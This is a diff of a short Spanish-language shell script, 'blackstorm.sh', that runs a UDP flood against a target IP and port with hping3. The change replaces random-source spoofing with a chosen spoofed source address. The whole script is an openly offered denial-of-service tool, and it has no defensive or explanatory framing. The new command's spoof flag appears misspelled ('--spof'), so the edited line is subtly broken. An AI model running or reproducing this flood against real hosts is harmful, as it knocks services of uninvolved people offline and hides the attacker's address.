@@ -4,7 +4,7 @@
 # Uso: sh blackstorm.sh ip_target puerto_target ip_spoof
 echo
 echo UDP Flood con herramienta hping3
-echo "Uso: ./udpflood.sh IP Puerto_UDP"
+echo "Uso: ./blackstorm.sh IP Puerto_UDP IP_spoof"
 echo "Control + C para interrumpir"
 echo 
-hping3 $1 -2 --rand-source -p $2 --flood -d 1440 $3 $4
+hping3 $1 -2  -p $2 --spof $3 --flood $4
